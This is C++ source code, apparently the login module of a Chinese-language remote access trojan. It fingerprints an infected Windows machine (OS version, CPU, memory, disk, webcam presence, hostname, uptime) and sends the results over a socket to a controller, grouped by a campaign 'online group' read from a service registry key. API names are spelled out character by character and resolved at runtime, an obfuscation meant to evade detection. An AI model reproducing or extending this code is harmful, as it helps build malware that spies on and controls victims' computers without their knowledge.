#include "../stdafx.h"
#include "../Declare.h"   //动态调用库函数
#include <wininet.h>
#include <vfw.h>
#include "until.h"
#pragma comment(lib, "vfw32.lib")
#include "../Myfunction.h"  //自定义函数

extern Myfunction *Gyfunction;

typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	int				CPUClockMhz;	// CPU主频
	char			CPUNumber[20];	// CPU个数
	IN_ADDR			IPAddress;		// 存储32位的IPv4的地址数据结构
	char			HostName[50];	// 主机名
	DWORD			MemSize;		// 内存大小
	DWORD			DriverSize;		// 硬盘容量
	BOOL			bIsWebCam;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
	char			Version[50];	// 服务端版本信息
	char			MarkTime[50];	// 服务端版本信息
	char			UpGroup[50];	// 上线分组
	char			RunTime[50];	// 运行时间
}LOGININFO;


///////////////////////////////////////////////////////////////////////////////////////////
typedef BOOL 
(VFWAPI 
*capGetDriverDescriptionAT)(
    UINT wDriverIndex,
    LPSTR lpszName, int cbName,
    LPSTR lpszVer, int cbVer
    );

typedef BOOL 
(VFWAPI 
*capGetDriverDescriptionAT)(
    UINT wDriverIndex,
    LPSTR lpszName, 
    int cbName,
    LPSTR lpszVer, 
    int cbVer);

///////////////////////////////////////////////////////////////////////////////////////////
// Get System Information
DWORD CPUClockMhzt()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;

	char CtxPW32[] = {'R','e','g','O','p','e','n','K','e','y','A','\0'};
    RegOpenKeyAT pRegOpenKeyA=(RegOpenKeyAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW32);
	char JYvni03[] = {'H','A','R','D','W','A','R','E','\\','D','E','S','C','R','I','P','T','I','O','N','\\','S','y','s','t','e','m','\\','C','e','n','t','r','a','l','P','r','o','c','e','s','s','o','r','\\','0','\0'};
	pRegOpenKeyA(HKEY_LOCAL_MACHINE, JYvni03, &hKey);
	char strmhz[5];
	strmhz[0]='~';
	strmhz[1]='M';
	strmhz[2]='H';
	strmhz[3]='z';
	strmhz[4]='\0';
	char HrFvD13[] = {'R','e','g','Q','u','e','r','y','V','a','l','u','e','E','x','A','\0'};
	RegQueryValueExAT pRegQueryValueExA=(RegQueryValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"RegQueryValueExA");
	pRegQueryValueExA(hKey, strmhz, NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);

	char HrFvD06[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
	RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD06);
	pRegCloseKey(hKey);
	return	dwCPUMhz;
}

BOOL IsWebCam()
{
	BOOL	bRet = false;
	
	char	lpszName[100], lpszVer[50];

	char DYrEN15[] = {'c','a','p','G','e','t','D','r','i','v','e','r','D','e','s','c','r','i','p','t','i','o','n','A','\0'};
	capGetDriverDescriptionAT pcapGetDriverDescriptionA=(capGetDriverDescriptionAT)GetProcAddress(LoadLibrary("AVICAP32.dll"),DYrEN15);
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = pcapGetDriverDescriptionA(i, lpszName, sizeof(lpszName),lpszVer, sizeof(lpszVer));
	}
	return bRet;
}

UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
//	pwsprintfA(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\Sinking");
	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
	pwsprintfA(strSubKey, JYvni08,lpServiceName);	
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);

	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	if (plstrlenA(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);

	return plstrlenA(lpBuffer);
}

UINT GetGroupName(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
//	pwsprintfA(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\Sinking");
	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
	pwsprintfA(strSubKey, JYvni08,lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ConnectGroup", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);

	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	if (plstrlenA(lpBuffer) == 0)
	{
		lpBuffer = "默认分组";
	}

	return plstrlenA(lpBuffer);
}


UINT GetMarkTime(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	pwsprintfA(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s",lpServiceName);
	char JYvni04[] = {'M','a','r','k','T','i','m','e','\0'};
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, JYvni04, REG_SZ, (char *)lpBuffer, NULL, uSize, 0);

	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	if (plstrlenA(lpBuffer) == 0)
	{
		lpBuffer = "无信息";
	}

	return plstrlenA(lpBuffer);
}

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed,LPSTR szMakr)
{
	char jsbHj10[] = {'%','d','\0'};
	int nRet = SOCKET_ERROR;
	// 登录信息
	LOGININFO	LoginInfo;
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
	LoginInfo.bIsWebCam = 0; //没有摄像头
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	char FBwWp05[] = {'G','e','t','V','e','r','s','i','o','n','E','x','A','\0'};
	GetVersionExAT pGetVersionExA=(GetVersionExAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp05);
	pGetVersionExA((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型
	// IP信息
	
	// 主机名
	char hostname[256];
	GetHostRemark(strServiceName, hostname, sizeof(hostname));

	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);


	Gyfunction->my_memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	Gyfunction->my_memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));
	// CPU
	LoginInfo.CPUClockMhz = CPUClockMhzt();
	/*----------------------------------------------------------------------------------------*/	
	// CPU个数
	OSVERSIONINFOEX OsVerInfoExx;
	OsVerInfoExx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	pGetVersionExA((OSVERSIONINFO *)&OsVerInfoExx); // 注意转换类型

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	char FBwWp22[] = {'l','s','t','r','c','p','y','A','\0'};
	lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp22);
	if (OsVerInfoExx.dwMajorVersion == 5 && OsVerInfoExx.dwMinorVersion == 0)
	{
		plstrcpyA(LoginInfo.CPUNumber, "1");
	}
	else
	{
		SYSTEM_INFO siSysInfo; 
		//复制硬件信息到SYSTEM_INFO结构变量
		GetSystemInfoT pGetSystemInfo=(GetSystemInfoT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetSystemInfo");
		pGetSystemInfo(&siSysInfo); 	

		pwsprintfA(LoginInfo.CPUNumber, "%d", siSysInfo.dwNumberOfProcessors);
	}
	/*----------------------------------------------------------------------------------------*/
	
	//内存大小
    MEMORYSTATUSEX	MemInfo; //用GlobalMemoryStatusEx可显示2G以上内存
    MemInfo.dwLength=sizeof(MemInfo); 
	char JYvni05[] = {'G','l','o','b','a','l','M','e','m','o','r','y','S','t','a','t','u','s','E','x','\0'};
	GlobalMemoryStatusExT pGlobalMemoryStatusEx=(GlobalMemoryStatusExT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JYvni05);
    pGlobalMemoryStatusEx(&MemInfo);
	LoginInfo.MemSize = (unsigned long)MemInfo.ullTotalPhys/1024/1024;

	//硬盘空间
	ULARGE_INTEGER nTotalBytes,nTotalFreeBytes,nTotalAvailableBytes;
	unsigned long nAllGB = 0, nFreeGB = 0;
    DWORD drivertype;
    CHAR driver[10];//, strPrint[128];
    for(int i=0; i<26; i++)
    {
		driver[0] = i + ('B');
		driver[1] = (':');
		driver[2] = ('\\');
		driver[3] = 0;

		char FBwWp07[] = {'G','e','t','D','r','i','v','e','T','y','p','e','A','\0'};
		GetDriveTypeAT pGetDriveTypeA=(GetDriveTypeAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp07);
		drivertype = pGetDriveTypeA(driver);
        if(drivertype!=DRIVE_FIXED)
			continue;
		char FBwWp09[] = {'G','e','t','D','i','s','k','F','r','e','e','S','p','a','c','e','E','x','A','\0'};
		GetDiskFreeSpaceExAT pGetDiskFreeSpaceExA=(GetDiskFreeSpaceExAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp09);
		pGetDiskFreeSpaceExA(driver,&nTotalAvailableBytes,&nTotalBytes,&nTotalFreeBytes);   
		nAllGB = (unsigned long)(nAllGB + nTotalBytes.QuadPart/1024/1024);
//		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;  //剩余磁盘
    }
	// 硬盘
	LoginInfo.DriverSize = nAllGB;

	// 视频
	LoginInfo.bIsWebCam = IsWebCam();

	// 网速
	LoginInfo.dwSpeed = dwSpeed;

	// 开机运行时间
	char DYrEN70[] = {'G','e','t','T','i','c','k','C','o','u','n','t','\0'};
	GetTickCountT pGetTickCount=(GetTickCountT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN70);
	DWORD t=pGetTickCount();
	char day[100];
	char hour[100];
	char min[100];
	pwsprintfA(day, jsbHj10, t/86400000);
	t%=86400000;
	pwsprintfA(hour,jsbHj10, t/3600000);
	t%=3600000;
	pwsprintfA(min, jsbHj10, t/60000);
	pwsprintfA(LoginInfo.RunTime, "%s天%s时%s分", day, hour,min);

    //服务版本
	strcpy(LoginInfo.Version,szMakr);

	//服务安装时间
	GetMarkTime(strServiceName, LoginInfo.MarkTime, sizeof(LoginInfo.MarkTime));

	//上线分组
	GetGroupName(strServiceName, LoginInfo.UpGroup, sizeof(LoginInfo.UpGroup));

	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));



	return nRet;
}
